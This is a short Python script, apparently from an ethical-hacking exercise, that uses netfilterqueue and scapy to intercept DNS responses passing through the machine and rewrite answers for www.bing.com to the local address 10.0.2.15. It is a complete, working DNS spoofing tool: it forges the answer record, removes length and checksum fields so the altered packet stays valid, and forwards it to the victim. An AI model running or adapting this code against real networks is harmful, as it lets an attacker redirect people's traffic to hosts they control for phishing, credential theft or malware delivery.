import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())

	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname

		if b'www.bing.com' in qname:
			print('[+] Spoofing target')
			#modifying the answer layer
			answer = scapy.DNSRR(rrname='bing.com.', rdata='10.0.2.15')
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			# making sure the packet is not corrupted
			del scapy_packet[scapy.IP].len	
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			#set original payload to modified scapy packet
			print(scapy_packet.show())
			packet.set_payload(bytes(scapy_packet))


	packet.accept()



queue = netfilterqueue.NetfilterQueue()
# queue number is set to the queue number set in the iptables rule (0)
queue.bind(0, process_packet)
queue.run() 